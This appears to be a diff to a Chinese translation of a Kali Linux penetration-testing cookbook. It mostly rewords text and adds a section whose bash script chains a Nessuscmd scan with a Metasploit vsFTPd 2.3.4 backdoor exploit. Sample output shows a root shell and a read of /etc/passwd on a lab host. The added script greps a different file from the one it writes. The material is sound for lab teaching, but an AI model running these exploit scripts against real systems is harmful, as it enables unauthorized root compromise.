@@ -91,7 +91,7 @@ for x in $(grep open $file | grep 445 | cut -d " " -f 2);
 done 
 ```
 
-为了确保你能理解脚本的功能，我们将按顺序讲解每一行。 前几行与上一个秘籍中讨论的脚本类似。 第一行指向 bash 解释器，第二行检查是否提供参数，第三行将输入值赋给易于理解的变量名。 脚本的主体有一定区分。 `for`循环用于遍历通过`grep`函数获取的 IP 地址列表。 从`grep`函数输出的 IP 地址列表对应在 TCP 端口 445 上运行服务的所有系统。然后对这些 IP 地址中的每一个执行 Nmap NSE 脚本。 通过仅在先前已标识为在 TCP 445 上运行服务的系统上运行此脚本，执行 NSE 扫描所需的时间大大减少。
+为了确保你能理解脚本的功能，我们将按顺序讲解每一行。 前几行与上一个秘籍中讨论的脚本类似。 第一行指向 bash 解释器，第二行检查是否提供参数，第三行将输入值赋给易于理解的变量名。 脚本的正文有一定区分。 `for`循环用于遍历通过`grep`函数获取的 IP 地址列表。 从`grep`函数输出的 IP 地址列表对应在 TCP 端口 445 上运行服务的所有系统。然后对这些 IP 地址中的每一个执行 Nmap NSE 脚本。 通过仅在先前已标识为在 TCP 445 上运行服务的系统上运行此脚本，执行 NSE 扫描所需的时间大大减少。
 
 ```
 root@KaliLinux:~# ./smb_eval.sh 
@@ -148,7 +148,7 @@ Nmap done: 1 IP address (1 host up) scanned in 5.18 seconds
 
 通过提供`grep`序列作为`for`循环要使用的值，此秘籍中的 bash 脚本基本上只是循环遍历该函数的输出。 通过独立运行该函数，可以看到它只提取对应运行 SMB 服务的主机的 IP 地址列表。 然后，`for`循环遍历这些IP地址，并对每个 IP 地址执行 NSE 脚本。
 
-## 8.3 使用 MSF 利用程序的 Nmap MSE 漏洞扫描
+## 8.3 使用 MSF 漏洞利用的 Nmap MSE 漏洞扫描
 
 在某些情况下，开发一个将漏洞扫描与利用相结合的脚本可能会有所帮助。 漏洞扫描通常会导致误报，因此通过执行漏洞扫描的后续利用，可以立即验证这些发现的正确性。 此秘籍使用 bash 脚本来执行`smb-check-vulns.nse`脚本，来确定主机是否存在 MS08-067 NetAPI 漏洞，并且如果 NSE 脚本显示如此，Metasploit 会用于 自动尝试利用它来验证。
 
@@ -178,7 +178,7 @@ fi
 rm tmp_output.txt  
 ```
 
-为了确保你能理解脚本的功能，我们将按顺序对每一行进行讲解。脚本中的前几行与本章前面讨论的脚本相同。第一行定义解释器，第二行测试输入，第三，第四和第五行都用于根据用户输入定义变量。在此脚本中，提供的用户变量对应 Metasploit 中使用的变量。 `RHOST`变量应该定义目标的 IP 地址，`LHOST`变量应该定义反向监听器的 IP 地址，`LPORT`变量应该定义正在监听的本地端口。然后脚本在主体中执行的第一个任务是，对目标系统的 IP 地址执行`smb-check-vulns.nse`脚本，它由`RHOST`输入定义。然后，结果以正常格式输出到临时文本文件。然后，`if ... then`条件语句与`grep`函数结合使用，来测试输出文件中是否有唯一的字符串，它表明系统存在漏洞。如果发现了唯一的字符串，则脚本会显式系统看起来存在漏洞，然后使用 Metasploit 框架命令行界面（MSFCLI）使用 Meterpreter 载荷执行 Metasploit 漏洞利用。最后，在加载漏洞利用后，使用`rm`函数从文件系统中删除 Nmap 临时输出文件。`test_n_xploit.sh bash`命令执行如下：
+为了确保你能理解脚本的功能，我们将按顺序对每一行进行讲解。脚本中的前几行与本章前面讨论的脚本相同。第一行定义解释器，第二行测试输入，第三，第四和第五行都用于根据用户输入定义变量。在此脚本中，提供的用户变量对应 Metasploit 中使用的变量。 `RHOST`变量应该定义目标的 IP 地址，`LHOST`变量应该定义反向监听器的 IP 地址，`LPORT`变量应该定义正在监听的本地端口。然后脚本在正文中执行的第一个任务是，对目标系统的 IP 地址执行`smb-check-vulns.nse`脚本，它由`RHOST`输入定义。然后，结果以正常格式输出到临时文本文件。然后，`if ... then`条件语句与`grep`函数结合使用，来测试输出文件中是否有唯一的字符串，它表明系统存在漏洞。如果发现了唯一的字符串，则脚本会显式系统看起来存在漏洞，然后使用 Metasploit 框架命令行界面（MSFCLI）使用 Meterpreter 载荷执行 Metasploit 漏洞利用。最后，在加载漏洞利用后，使用`rm`函数从文件系统中删除 Nmap 临时输出文件。`test_n_xploit.sh bash`命令执行如下：
 
 ```
 root@KaliLinux:~# ./test_n_xploit.sh 
@@ -246,3 +246,73 @@ Server username: NT AUTHORITY\SYSTEM
 ### 工作原理
 
 MSFCLI 是 MSF 控制台的有效替代工具，可用于直接从终端执行单行命令，而不是在交互式控制台中工作。 这使得 MSFCLI 对于 bash shell 脚本中的使用是一个很好的功能。 因为可以从 bash 终端执行 NSE 脚本和 MSFCLI，所以可以轻松编写 shell 脚本来将这两个功能组合在一起。
+
+## 8.4 使用 MSF 漏洞利用的 Nessuscmd 漏洞扫描
+
+将 NSE 脚本和 Metasploit 利用结合到一起可以减轻工作量。可由 NSE 脚本测试的漏洞数量明显小于可通过专用漏洞扫描程序（如 Nessus）评估的漏洞数量。 幸运的是，Nessus 有一个名为 Nessuscmd 的命令行工具，也可以在 bash 中轻松访问。 该秘籍演示了如何将 Nessus 定向漏洞扫描与 MSF 自动利用相结合来验证发现。
+
+### 准备
+
+为了使用此秘籍中演示的脚本，你需要访问运行漏洞服务的系统，该服务可以使用 Nessus 进行标识，并且可以使用 Metasploit 进行利用。 提供的示例在 Metasploitable2 服务器上使用 vsFTPd 2.3.4 后门漏洞。 有关设置 Metasploitable2 的更多信息，请参阅本书第一章中的“安装 Metasploitable2”秘籍。
+
+此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章中的“使用文本编辑器（VIM 和 Nano）”秘籍。
+
+### 操作步骤
+
+下面的示例演示了如何使用 bash 脚本，将漏洞扫描和目标利用的任务结合到一起。 在这种情况下，Nessuscmd 用于运行 Nessus 插件，测试 vsFTPd 2.3.4 后门，以确定系统是否存在漏洞，然后如果发现系统存在漏洞，则对系统执行相应的 Metasploit 漏洞利用：
+
+```sh
+#! /bin/bash
+
+if [ ! $1 ]; then echo "Usage: #./script <RHOST>"; exit; fi
+
+rhost=$1
+
+/opt/nessus/bin/nessuscmd -p 21 -i 55523 $rhost >> tmp_output.txt 
+if [ $(grep 55523 output.txt | cut -d " " -f 9) = "55523" ];    
+    then echo "$rhost appears to be vulnerable, exploiting with Metasploit...";   
+    msfcli exploit/unix/ftp/vsftpd_234_backdoor PAYLOAD=cmd/unix/ 
+    interact RHOST=$rhost E; 
+fi 
+rm tmp_output.txt 
+```
+
+脚本的开头非常类似于漏洞扫描和利用脚本，它将 NSE 扫描与前一个秘籍中的 MSF 利用组合在一起。但是，由于在此特定脚本中使用了不同的载荷，因此用户必须提供的唯一参数是`RHOST`值，该值应该是目标系统的 IP 地址。脚本的正文以执行 Nessuscmd 工具开始。 `-p`参数声明正在评估的远程端口，`-i`参数声明插件号。插件 55523 对应 VSFTPd 2.3.4 后门的 Nessus 审计。 然后，Nessuscmd 的输出重定向到一个名为`tmp_output.txt`的临时输出文件。如果目标系统上存在此漏洞，则此脚本的输出将仅返回插件 ID。所以下一行使用`if ... then`条件语句结合`grep`序列，来确定返回的输出中的插件 ID。如果输出中返回了插件ID，表明系统应该存在漏洞，那么将执行相应的 Metasploit 利用模块。
+
+```
+root@KaliLinux:~# ./nessuscmd_xploit.sh 
+Usage: #./script <RHOST>
+```
+
+如果在不提供任何参数的情况下执行脚本，脚本将输出相应的用法。 此使用描述表示，应使用`RHOST`参数执行脚本，它用于定义目标 IP 地址。 此输入值将用于 Nessuscmd 漏洞扫描和（如果存在漏洞）使用 Metasploit 在目标系统上执行利用。 在以下示例中，脚本用于确定 IP 地址为`172.16.36.135`的主机是否存在漏洞。 如果系统被确定为存在漏洞，则将执行该利用，并自动建立与后门的连接。
+
+```
+root@KaliLinux:~# ./nessuscmd_xploit.sh 172.16.36.135 
+172.16.36.135 appears to be vulnerable, exploiting with Metasploit... 
+[*] Initializing modules... 
+PAYLOAD => cmd/unix/interact 
+RHOST => 172.16.36.135 
+[*] Banner: 220 (vsFTPd 2.3.4) 
+[*] USER: 331 Please specify the password. 
+[+] Backdoor service has been spawned, handling... 
+[+] UID: uid=0(root) gid=0(root) 
+[*] Found shell. 
+[*] Command shell session 1 opened (172.16.36.232:48126 -> 172.16.36.135:6200) at 2014-04-28 00:29:21 -0400
+
+whoami 
+root 
+cat /etc/passwd 
+root:x:0:0:root:/root:/bin/bash 
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
+bin:x:2:2:bin:/bin:/bin/sh 
+sys:x:3:3:sys:/dev:/bin/sh 
+sync:x:4:65534:sync:/bin:/bin/sync 
+                            **{TRUNCATED}** 
+```
+
+因为 Nessuscmd 的输出被重定向到临时文件，而不是使用集成的输出函数，所以没有脚本返回的输出来表明扫描成功，除了一个字符串用于指示系统看起来存在 Metasploit 试图利用的漏洞。 一旦脚本执行完毕，将在目标系统上返回具有`root`权限的交互式 shell。 为了演示这一点，我们使用了`whoami`和`cat`命令。
+
+### 工作原理
+
+Nessuscmd 是 Nessus 漏洞扫描器中包含的命令行工具。 此工具可用于通过直接从终端执行目标扫描，来扫描和评估不同插件的结果。 因为该工具（如 MSFCLI）可以轻易从 bash 终端调用，所以我们很容易构建一个脚本，将两个任务串联到一起，将漏洞扫描与利用相结合。
+
